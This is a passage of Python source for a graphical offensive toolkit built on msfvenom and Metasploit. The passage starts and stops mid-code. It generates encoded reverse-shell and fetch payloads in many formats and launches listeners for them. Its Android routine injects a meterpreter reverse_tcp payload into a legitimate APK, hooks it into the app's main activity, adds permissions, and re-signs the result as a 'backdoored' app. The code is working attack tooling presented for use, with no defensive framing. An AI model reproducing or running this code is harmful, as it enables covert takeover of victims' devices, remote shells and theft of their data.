            # Build the msfvenom command
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            QMessageBox.critical(self, "Error", f"Connection method {conn_method} not supported for {platform} {payload_type}")
                            return
                    else:
                        QMessageBox.critical(self, "Error", f"Payload type {payload_type} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                    return
            
            # Start building the command
            cmd_parts = ["msfvenom", "-p", payload]
            
            # Add LHOST and LPORT
            cmd_parts.extend([f"LHOST={lhost}", f"LPORT={lport}"])
            
            # Add encoding options if selected
            if self.use_encoding_check.isChecked():
                cmd_parts.extend(["-e", self.encoder_combo.currentText()])
                cmd_parts.extend(["-i", str(self.iterations_spin.value())])
            
            # For Android platform, always use raw format with .apk extension
            if platform == "android":
                cmd_parts.extend(["-f", "raw"])
                output_file = f"{self.toolkit.output_dir}/{payload_name}.apk"
                self.update_status("Note: For Android payloads, using raw format with .apk extension")
            else:
                cmd_parts.extend(["-f", output_format])
                output_file = f"{self.toolkit.output_dir}/{payload_name}.{output_format}"
            
            # Add output file
            cmd_parts.extend(["-o", output_file])
            
            command = " ".join(cmd_parts)
            self.update_status(f"Generated command: {command}")
            
            # Execute the command in a separate thread
            self.worker = CommandWorker(command)
            self.worker.finished.connect(self.on_command_finished)
            self.worker.status.connect(self.update_status)
            self.worker.start()
            self.show_progress()
            
            # Ask if user wants to start handler
            reply = QMessageBox.question(
                self, "Start Handler", 
                "Do you want to start the Metasploit handler?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.start_handler_from_tab()
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate payload: {str(e)}")
            self.update_status(f"Error generating payload: {str(e)}")
    
    def on_command_finished(self, success, message):
        """Handle command completion."""
        self.hide_progress()
        if success:
            self.update_status("Command executed successfully")
            if message:
                self.update_status(f"Output: {message}")
            QMessageBox.information(self, "Success", "Payload generated successfully!")
        else:
            self.update_status(f"Command failed: {message}")
            QMessageBox.critical(self, "Error", f"Failed to generate payload: {message}")
    
    def inject_android_payload(self):
        """Inject a payload into an original APK."""
        try:
            # Get values from GUI
            lhost = self.android_lhost_edit.text()
            lport = self.android_lport_edit.text()
            payload_name = self.android_payload_name_edit.text()
            original_apk = self.original_apk_edit.text()
            
            # Validate inputs
            if not all([lhost, lport, payload_name, original_apk]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            if not os.path.exists(original_apk):
                QMessageBox.critical(self, "File Error", f"APK file not found: {original_apk}")
                return
            
            # Get selected permissions
            selected_permissions = []
            for perm_group, check in self.android_permissions.items():
                if check.isChecked():
                    selected_permissions.extend(
                        self.toolkit.android_configs["permissions"][perm_group]
                    )
            
            # Update toolkit settings
            self.toolkit.config["android_settings"]["keystore_path"] = self.keystore_path_edit.text()
            self.toolkit.config["android_settings"]["keystore_password"] = self.keystore_pass_edit.text()
            self.toolkit.config["android_settings"]["key_alias"] = self.key_alias_edit.text()
            self.toolkit.config["android_settings"]["key_password"] = self.key_pass_edit.text()
            
            # Execute in a separate thread
            self.show_progress()
            self.update_status("Starting Android payload injection...")
            
            # Create temporary directory for processing
            temp_dir = tempfile.mkdtemp()
            self.update_status(f"Working directory: {temp_dir}")
            
            # Step 1: Generate the raw payload APK
            self.update_status("Step 1: Generating raw payload APK...")
            payload_apk = os.path.join(temp_dir, "payload.apk")
            cmd = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-o", payload_apk
            ]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to generate payload APK")
                self.hide_progress()
                return
            
            self.update_status(f"Payload APK generated: {payload_apk}")
            
            # Step 2: Decompile payload APK
            self.update_status("Step 2: Decompiling payload APK...")
            payload_src = os.path.join(temp_dir, "payload_src")
            cmd = ["apktool", "d", payload_apk, "-o", payload_src]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to decompile payload APK")
                self.hide_progress()
                return
            
            self.update_status(f"Payload APK decompiled to: {payload_src}")
            
            # Step 3: Decompile original APK
            self.update_status("Step 3: Decompiling original APK...")
            legit_src = os.path.join(temp_dir, "legit_src")
            cmd = ["apktool", "d", original_apk, "-o", legit_src]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to decompile original APK")
                self.hide_progress()
                return
            
            self.update_status(f"Original APK decompiled to: {legit_src}")
            
            # Step 4: Copy payload smali to legitimate app
            self.update_status("Step 4: Copying payload smali to legitimate app...")
            metasploit_smali = os.path.join(payload_src, "smali", "com", "metasploit")
            target_smali = os.path.join(legit_src, "smali", "com")
            
            if not os.path.exists(metasploit_smali):
                self.update_status(f"Metasploit smali directory not found: {metasploit_smali}")
                self.hide_progress()
                return
            
            # Copy the entire metasploit smali directory
            if os.path.exists(target_smali):
                shutil.rmtree(target_smali)
            shutil.copytree(metasploit_smali, target_smali)
            self.update_status("Copied payload smali to legitimate app")
            
            # Step 5: Find main activity and inject payload startup code
            self.update_status("Step 5: Injecting payload startup code...")
            
            # Parse AndroidManifest.xml to find main activity
            manifest_path = os.path.join(legit_src, "AndroidManifest.xml")
            main_activity = self.toolkit.find_main_activity(manifest_path)
            
            if not main_activity:
                self.update_status("Failed to find main activity in AndroidManifest.xml")
                self.hide_progress()
                return
            
            self.update_status(f"Found main activity: {main_activity}")
            
            # Convert main activity path to smali file path
            main_activity_path = main_activity.replace(".", "/")
            main_activity_smali = os.path.join(legit_src, "smali", f"{main_activity_path}.smali")
            
            if not os.path.exists(main_activity_smali):
                # Try with $ if it's an inner class
                main_activity_smali = os.path.join(legit_src, "smali", f"{main_activity_path.replace('$', '$$')}.smali")
            
            if not os.path.exists(main_activity_smali):
                self.update_status(f"Main activity smali file not found: {main_activity_smali}")
                self.hide_progress()
                return
            
            # Inject payload startup code
            if not self.toolkit.inject_payload_startup(main_activity_smali):
                self.update_status("Failed to inject payload startup code")
                self.hide_progress()
                return
            
            self.update_status("Injected payload startup code into main activity")
            
            # Step 6: Add required permissions and service to AndroidManifest.xml
            self.update_status("Step 6: Modifying AndroidManifest.xml...")
            
            if not self.toolkit.modify_android_manifest(manifest_path, selected_permissions):
                self.update_status("Failed to modify AndroidManifest.xml")
                self.hide_progress()
                return
            
            self.update_status("Modified AndroidManifest.xml")
            
            # Step 7: Rebuild the APK
            self.update_status("Step 7: Rebuilding APK...")
            unsigned_apk = os.path.join(temp_dir, "unsigned_backdoor.apk")
            cmd = ["apktool", "b", legit_src, "-o", unsigned_apk]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to rebuild APK")
                self.hide_progress()
                return
            
            self.update_status(f"Rebuilt APK: {unsigned_apk}")
            
            # Step 8: Create signing key if it doesn't exist
            self.update_status("Step 8: Creating signing key...")
            keystore_path = self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore")
            
            if not os.path.exists(keystore_path):
                cmd = [
                    "keytool",
                    "-genkey",
                    "-v",
                    "-keystore", keystore_path,
                    "-alias", self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"),
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-storepass", self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"),
                    "-keypass", self.toolkit.config.get("android_settings", {}).get("key_password", "android"),
                    "-dname", "CN=Android, OU=Android, O=Android, L=Android, S=Android, C=US"
                ]
                
                if not self.toolkit.execute_command(" ".join(cmd)):
                    self.update_status("Failed to create signing key")
                    self.hide_progress()
                    return
                
                self.update_status(f"Created signing key: {keystore_path}")
            else:
                self.update_status(f"Using existing signing key: {keystore_path}")
            
            # Step 9: Sign the APK
            self.update_status("Step 9: Signing APK...")
            signed_apk = os.path.join(temp_dir, "signed_backdoor.apk")
            cmd = [
                "jarsigner",
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", keystore_path,
                "-storepass", self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"),
                "-keypass", self.toolkit.config.get("android_settings", {}).get("key_password", "android"),
                "-signedjar", signed_apk,
                unsigned_apk,
                self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey")
            ]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Failed to sign APK")
                self.hide_progress()
                return
            
            self.update_status(f"Signed APK: {signed_apk}")
            
            # Step 10: Align the APK (optional but recommended)
            self.update_status("Step 10: Aligning APK...")
            final_apk = os.path.join(self.toolkit.output_dir, f"{payload_name}.apk")
            cmd = ["zipalign", "-v", "4", signed_apk, final_apk]
            
            if not self.toolkit.execute_command(" ".join(cmd)):
                self.update_status("Warning: Failed to align APK, using signed APK instead")
                shutil.copy2(signed_apk, final_apk)
            else:
                self.update_status(f"Aligned APK: {final_apk}")
            
            self.update_status(f"Backdoored APK generated successfully: {final_apk}")
            self.update_status("This APK should work on Android 10-15")
            
            # Clean up temporary directory
            shutil.rmtree(temp_dir)
            
            self.hide_progress()
            
            # Ask if user wants to start handler
            reply = QMessageBox.question(
                self, "Start Handler", 
                "Do you want to start the Metasploit handler?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.start_android_handler()
                
        except Exception as e:
            self.hide_progress()
            QMessageBox.critical(self, "Error", f"Failed to inject payload: {str(e)}")
            self.update_status(f"Error injecting Android payload: {str(e)}")
    
    def generate_fetch_payload(self):
        """Generate a fetch payload."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_group.checkedButton().property("value")
            protocol = self.fetch_protocol_group.checkedButton().property("value")
            lhost = self.fetch_lhost_edit.text()
            lport = self.fetch_lport_edit.text()
            fetch_srvhost = self.fetch_srvhost_edit.text()
            fetch_srvport = self.fetch_srvport_edit.text()
            payload_name = self.fetch_payload_name_edit.text()
            
            # Validate inputs
            if not all([lhost, lport, fetch_srvhost, fetch_srvport, payload_name]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Build the fetch payload command
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        QMessageBox.critical(self, "Error", f"Protocol {protocol} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Fetch payloads are not supported for {platform}")
                    return
            else:
                QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                return
            
            # Build the command
            command = (
                f"msfvenom -p {payload} "
                f"LHOST={lhost} "
                f"LPORT={lport} "
                f"FETCH_SRVHOST={fetch_srvhost} "
                f"FETCH_SRVPORT={fetch_srvport} "
                "-f raw"
            )
            
            self.update_status(f"Generated command: {command}")
            
            # Execute the command in a separate thread
            self.worker = CommandWorker(command)
            self.worker.finished.connect(self.on_command_finished)
            self.worker.status.connect(self.update_status)
            self.worker.start()
            self.show_progress()
            
            # Ask if user wants to start handler
            reply = QMessageBox.question(
                self, "Start Handler", 
                "Do you want to start the Metasploit handler?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.start_fetch_handler()
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate fetch payload: {str(e)}")
            self.update_status(f"Error generating fetch payload: {str(e)}")
    
    def generate_multi_format_payload(self):
        """Generate multiple formats of the same payload."""
        try:
            # Get values from GUI
            platform = self.multi_platform_group.checkedButton().property("value")
            payload_type = self.multi_payload_group.checkedButton().property("value")
            conn_method = self.multi_conn_group.checkedButton().property("value")
            lhost = self.multi_lhost_edit.text()
            lport = self.multi_lport_edit.text()
            payload_name = self.multi_payload_name_edit.text()
            
            # Validate inputs
            if not all([lhost, lport, payload_name]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            QMessageBox.critical(self, "Error", f"Connection method {conn_method} not supported for {platform} {payload_type}")
                            return
                    else:
                        QMessageBox.critical(self, "Error", f"Payload type {payload_type} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                    return
            
            # Get formats
            formats = self.toolkit.payload_configs[platform]["formats"]
            self.update_status(f"Generating payload in {len(formats)} formats...")
            
            # Execute in a separate thread
            self.show_progress()
            success_count = 0
            
            for fmt in formats:
                # Build the command for this format
                cmd_parts = ["msfvenom", "-p", payload]
                
                # Add LHOST and LPORT
                cmd_parts.extend([f"LHOST={lhost}", f"LPORT={lport}"])
                
                # Add encoding options if selected
                if self.multi_use_encoding_check.isChecked():
                    cmd_parts.extend(["-e", self.multi_encoder_combo.currentText()])
                    cmd_parts.extend(["-i", str(self.multi_iterations_spin.value())])
                
                # Add format
                cmd_parts.extend(["-f", fmt])
                
                # Add output file
                output_file = f"{self.toolkit.output_dir}/{payload_name}.{fmt}"
                cmd_parts.extend(["-o", output_file])
                
                command = " ".join(cmd_parts)
                
                self.update_status(f"Generating {fmt} format...")
                if self.toolkit.execute_command(command):
                    self.update_status(f"Generated: {output_file}")
                    success_count += 1
                else:
                    self.update_status(f"Failed to generate {fmt} format")
            
            self.update_status(f"Summary: {success_count}/{len(formats)} formats generated successfully")
            self.hide_progress()
            
            # Ask if user wants to start handler
            if success_count > 0:
                reply = QMessageBox.question(
                    self, "Start Handler", 
                    "Do you want to start the Metasploit handler?",
                    QMessageBox.Yes | QMessageBox.No
                )
                if reply == QMessageBox.Yes:
                    self.start_multi_handler()
                
        except Exception as e:
            self.hide_progress()
            QMessageBox.critical(self, "Error", f"Failed to generate multi-format payload: {str(e)}")
            self.update_status(f"Error generating multi-format payload: {str(e)}")
    
    def start_listener(self):
        """Start a Metasploit listener."""
        try:
            # Get values from GUI
            payload = self.listener_payload_combo.currentText()
            lhost = self.listener_lhost_edit.text()
            lport = self.listener_lport_edit.text()
            
            # Validate inputs
            if not all([lhost, lport]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Update toolkit settings
            self.toolkit.config["open_terminal_for_handler"] = self.open_terminal_check.isChecked()
            self.toolkit.config["terminal_emulator"] = self.terminal_combo.currentText()
            self.toolkit.config["terminal_title"] = self.terminal_title_edit.text()
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start listener: {str(e)}")
            self.update_status(f"Error starting listener: {str(e)}")
    
    def start_handler_from_tab(self):
        """Start a handler from the traditional payload tab."""
        try:
            # Get values from GUI
            platform = self.platform_group.checkedButton().property("value")
            payload_type = self.payload_group.checkedButton().property("value")
            conn_method = self.conn_group.checkedButton().property("value")
            lhost = self.lhost_edit.text()
            lport = self.lport_edit.text()
            
            # Validate inputs
            if not all([lhost, lport]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            QMessageBox.critical(self, "Error", f"Connection method {conn_method} not supported for {platform} {payload_type}")
                            return
                    else:
                        QMessageBox.critical(self, "Error", f"Payload type {payload_type} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                    return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start handler: {str(e)}")
            self.update_status(f"Error starting handler: {str(e)}")
    
    def start_android_handler(self):
        """Start an Android handler from the Android injection tab."""
        try:
            # Get values from GUI
            lhost = self.android_lhost_edit.text()
            lport = self.android_lport_edit.text()
            
            # Validate inputs
            if not all([lhost, lport]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Start the handler
            self.toolkit.start_metasploit_handler("android/meterpreter/reverse_tcp", lhost, lport)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start handler: {str(e)}")
            self.update_status(f"Error starting handler: {str(e)}")
    
    def start_fetch_handler(self):
        """Start a fetch handler from the fetch payload tab."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_group.checkedButton().property("value")
            protocol = self.fetch_protocol_group.checkedButton().property("value")
            lhost = self.fetch_lhost_edit.text()
            lport = self.fetch_lport_edit.text()
            
            # Validate inputs
            if not all([lhost, lport]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        QMessageBox.critical(self, "Error", f"Protocol {protocol} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Fetch payloads are not supported for {platform}")
                    return
            else:
                QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start handler: {str(e)}")
            self.update_status(f"Error starting handler: {str(e)}")
    
    def start_multi_handler(self):
        """Start a multi-format handler from the multi-format tab."""
        try:
            # Get values from GUI
            platform = self.multi_platform_group.checkedButton().property("value")
            payload_type = self.multi_payload_group.checkedButton().property("value")
            conn_method = self.multi_conn_group.checkedButton().property("value")
            lhost = self.multi_lhost_edit.text()
            lport = self.multi_lport_edit.text()
            
            # Validate inputs
            if not all([lhost, lport]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            QMessageBox.critical(self, "Error", f"Connection method {conn_method} not supported for {platform} {payload_type}")
                            return
                    else:
                        QMessageBox.critical(self, "Error", f"Payload type {payload_type} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                    return
            
            # Start the handler
            self.toolkit.start_metasploit_handler(payload, lhost, lport)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start handler: {str(e)}")
            self.update_status(f"Error starting handler: {str(e)}")
    
    def view_command(self):
        """View the command that would be executed."""
        try:
            # Get values from GUI
            platform = self.platform_group.checkedButton().property("value")
            payload_type = self.payload_group.checkedButton().property("value")
            conn_method = self.conn_group.checkedButton().property("value")
            output_format = self.format_combo.currentText()
            lhost = self.lhost_edit.text()
            lport = self.lport_edit.text()
            payload_name = self.payload_name_edit.text()
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            QMessageBox.critical(self, "Error", f"Connection method {conn_method} not supported for {platform} {payload_type}")
                            return
                    else:
                        QMessageBox.critical(self, "Error", f"Payload type {payload_type} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                    return
            
            # Start building the command
            cmd_parts = ["msfvenom", "-p", payload]
            
            # Add LHOST and LPORT
            cmd_parts.extend([f"LHOST={lhost}", f"LPORT={lport}"])
            
            # Add encoding options if selected
            if self.use_encoding_check.isChecked():
                cmd_parts.extend(["-e", self.encoder_combo.currentText()])
                cmd_parts.extend(["-i", str(self.iterations_spin.value())])
            
            # For Android platform, always use raw format with .apk extension
            if platform == "android":
                cmd_parts.extend(["-f", "raw"])
                output_file = f"{self.toolkit.output_dir}/{payload_name}.apk"
            else:
                cmd_parts.extend(["-f", output_format])
                output_file = f"{self.toolkit.output_dir}/{payload_name}.{output_format}"
            
            # Add output file
            cmd_parts.extend(["-o", output_file])
            
            command = " ".join(cmd_parts)
            
            # Show the command in a dialog
            dialog = QDialog(self)
            dialog.setWindowTitle("Generated Command")
            dialog.resize(800, 200)
            
            layout = QVBoxLayout(dialog)
            
            command_text = QTextEdit()
            command_text.setPlainText(command)
            command_text.setReadOnly(True)
            command_text.setStyleSheet("""
                QTextEdit {
                    background-color: #2D2D44;
                    border: 1px solid #3A3A4F;
                    border-radius: 4px;
                    font-family: 'Consolas';
                    font-size: 12px;
                    padding: 10px;
                }
            """)
            layout.addWidget(command_text)
            
            button_layout = QHBoxLayout()
            layout.addLayout(button_layout)
            
            copy_btn = QPushButton("Copy to Clipboard")
            copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(command))
            button_layout.addWidget(copy_btn)
            
            close_btn = QPushButton("Close")
            close_btn.clicked.connect(dialog.accept)
            button_layout.addWidget(close_btn)
            
            dialog.exec_()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate command: {str(e)}")
            self.update_status(f"Error generating command: {str(e)}")
    
    def view_fetch_command(self):
        """View the fetch command that would be executed."""
        try:
            # Get values from GUI
            platform = self.fetch_platform_group.checkedButton().property("value")
            protocol = self.fetch_protocol_group.checkedButton().property("value")
            lhost = self.fetch_lhost_edit.text()
            lport = self.fetch_lport_edit.text()
            fetch_srvhost = self.fetch_srvhost_edit.text()
            fetch_srvport = self.fetch_srvport_edit.text()
            
            # Get the payload
            if platform in self.toolkit.payload_configs:
                if "fetch" in self.toolkit.payload_configs[platform]:
                    if protocol in self.toolkit.payload_configs[platform]["fetch"]:
                        payload = self.toolkit.payload_configs[platform]["fetch"][protocol]
                    else:
                        QMessageBox.critical(self, "Error", f"Protocol {protocol} not supported for {platform}")
                        return
                else:
                    QMessageBox.critical(self, "Error", f"Fetch payloads are not supported for {platform}")
                    return
            else:
                QMessageBox.critical(self, "Error", f"Platform {platform} not supported")
                return
            
            # Build the command
            command = (
                f"msfvenom -p {payload} "
                f"LHOST={lhost} "
                f"LPORT={lport} "
                f"FETCH_SRVHOST={fetch_srvhost} "
                f"FETCH_SRVPORT={fetch_srvport} "
                "-f raw"
            )
            
            # Show the command in a dialog
            dialog = QDialog(self)
            dialog.setWindowTitle("Generated Command")
            dialog.resize(800, 200)
            
            layout = QVBoxLayout(dialog)
            
            command_text = QTextEdit()
            command_text.setPlainText(command)
            command_text.setReadOnly(True)
            command_text.setStyleSheet("""
                QTextEdit {
                    background-color: #2D2D44;
                    border: 1px solid #3A3A4F;
                    border-radius: 4px;
                    font-family: 'Consolas';
                    font-size: 12px;
                    padding: 10px;
                }
            """)
            layout.addWidget(command_text)
            
            button_layout = QHBoxLayout()
            layout.addLayout(button_layout)
            
            copy_btn = QPushButton("Copy to Clipboard")
            copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(command))
            button_layout.addWidget(copy_btn)
            
            close_btn = QPushButton("Close")
            close_btn.clicked.connect(dialog.accept)
            button_layout.addWidget(close_btn)
            
            dialog.exec_()
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate command: {str(e)}")
            self.update_status(f"Error generating command: {str(e)}")
    
    def save_listener_settings(self):
        """Save the listener settings."""
        try:
            # Update toolkit settings
            self.toolkit.config["open_terminal_for_handler"] = self.open_terminal_check.isChecked()
            self.toolkit.config["terminal_emulator"] = self.terminal_combo.currentText()
            self.toolkit.config["terminal_title"] = self.terminal_title_edit.text()
            
            # Save configuration
            self.toolkit.save_config()
            
            QMessageBox.information(self, "Success", "Listener settings saved successfully!")
            self.update_status("Listener settings saved successfully")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save settings: {str(e)}")
            self.update_status(f"Error saving settings: {str(e)}")
    
    def save_settings(self):
        """Save the settings."""
        try:
            # Update toolkit settings
            self.toolkit.config['default_lhost'] = self.default_lhost_edit.text()
            self.toolkit.config['default_lport'] = self.default_lport_edit.text()
            self.toolkit.config['default_encoder'] = self.default_encoder_combo.currentText()
            self.toolkit.config['default_format'] = self.default_format_edit.text()
            self.toolkit.config['auto_start_handler'] = self.auto_start_handler_check.isChecked()
            self.toolkit.config['auto_detect_ip'] = self.auto_detect_ip_check.isChecked()
            self.toolkit.config["terminal_emulator"] = self.term_emulator_combo.currentText()
            self.toolkit.config["open_terminal_for_handler"] = self.term_open_check.isChecked()
            self.toolkit.config["terminal_title"] = self.term_title_edit.text()
            
            # Update Android settings
            self.toolkit.config["android_settings"]["target_sdk"] = self.android_target_sdk_combo.currentText()
            self.toolkit.config["android_settings"]["evasion_technique"] = self.android_evasion_combo.currentText()
            self.toolkit.config["android_settings"]["keystore_path"] = self.android_keystore_path_edit.text()
            self.toolkit.config["android_settings"]["keystore_password"] = self.android_keystore_pass_edit.text()
            self.toolkit.config["android_settings"]["key_alias"] = self.android_key_alias_edit.text()
            self.toolkit.config["android_settings"]["key_password"] = self.android_key_pass_edit.text()
            
            # Save configuration
            self.toolkit.save_config()
            
            QMessageBox.information(self, "Success", "Settings saved successfully!")
            self.update_status("Settings saved successfully")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save settings: {str(e)}")
            self.update_status(f"Error saving settings: {str(e)}")
    
    def reset_settings(self):
        """Reset settings to defaults."""
        try:
            reply = QMessageBox.question(
                self, "Reset Settings", 
                "Are you sure you want to reset all settings to defaults?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                # Create default configuration
                self.toolkit.config = self.toolkit.load_config()
                
                # Update GUI variables
                self.default_lhost_edit.setText(self.toolkit.config.get('default_lhost', '192.168.1.100'))
                self.default_lport_edit.setText(self.toolkit.config.get('default_lport', '4444'))
                self.default_encoder_combo.setCurrentText(self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
                self.default_format_edit.setText(self.toolkit.config.get('default_format', 'exe'))
                self.auto_start_handler_check.setChecked(self.toolkit.config.get('auto_start_handler', False))
                self.auto_detect_ip_check.setChecked(self.toolkit.config.get('auto_detect_ip', True))
                self.term_emulator_combo.setCurrentText(self.toolkit.config.get("terminal_emulator", "auto"))
                self.term_open_check.setChecked(self.toolkit.config.get("open_terminal_for_handler", True))
                self.term_title_edit.setText(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
                
                # Update Android settings
                android_settings = self.toolkit.config.get("android_settings", {})
                self.android_target_sdk_combo.setCurrentText(android_settings.get("target_sdk", "android_11"))
                self.android_evasion_combo.setCurrentText(android_settings.get("evasion_technique", "apk_wrapper"))
                self.android_keystore_path_edit.setText(android_settings.get("keystore_path", "mykey.keystore"))
                self.android_keystore_pass_edit.setText(android_settings.get("keystore_password", "android"))
                self.android_key_alias_edit.setText(android_settings.get("key_alias", "mykey"))
                self.android_key_pass_edit.setText(android_settings.get("key_password", "android"))
                
                # Save configuration
                self.toolkit.save_config()
                
                QMessageBox.information(self, "Success", "Settings reset to defaults!")
                self.update_status("Settings reset to defaults")
                
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to reset settings: {str(e)}")
            self.update_status(f"Error resetting settings: {str(e)}")
    
    def save_preset_config(self):
        """Save the current configuration as a preset."""
        try:
            # Ask for preset name
            preset_name, ok = QInputDialog.getText(
                self, "Save Preset", "Enter preset name:"
            )
            if ok and preset_name:
                # Save preset
                preset_file = f"preset_{preset_name}.json"
                with open(preset_file, 'w') as f:
                    json.dump(self.toolkit.config, f, indent=2)
                
                QMessageBox.information(self, "Success", f"Preset saved as {preset_file}")
                self.update_status(f"Preset saved as {preset_file}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save preset: {str(e)}")
            self.update_status(f"Error saving preset: {str(e)}")
    
    def load_preset_config(self):
        """Load a preset configuration."""
        try:
            # List available presets
            presets = [f for f in os.listdir('.') if f.startswith('preset_') and f.endswith('.json')]
            
            if not presets:
                QMessageBox.information(self, "No Presets", "No preset configurations found.")
                return
            
            # Create a dialog to select preset
            dialog = QDialog(self)
            dialog.setWindowTitle("Load Preset")
            dialog.resize(400, 300)
            
            layout = QVBoxLayout(dialog)
            
            layout.addWidget(QLabel("Select a preset to load:"))
            
            preset_list = QListWidget()
            for preset in presets:
                preset_list.addItem(preset[7:-5])  # Remove 'preset_' prefix and '.json' suffix
            layout.addWidget(preset_list)
            
            button_layout = QHBoxLayout()
            layout.addLayout(button_layout)
            
            load_btn = QPushButton("Load")
            load_btn.clicked.connect(dialog.accept)
            button_layout.addWidget(load_btn)
            
            cancel_btn = QPushButton("Cancel")
            cancel_btn.clicked.connect(dialog.reject)
            button_layout.addWidget(cancel_btn)
            
            if dialog.exec() == QDialog.Accepted and preset_list.currentItem():
                preset_index = preset_list.currentRow()
                preset_file = presets[preset_index]
                
                try:
                    with open(preset_file, 'r') as f:
                        self.toolkit.config = json.load(f)
                    
                    # Update GUI variables
                    self.default_lhost_edit.setText(self.toolkit.config.get('default_lhost', '192.168.1.100'))
                    self.default_lport_edit.setText(self.toolkit.config.get('default_lport', '4444'))
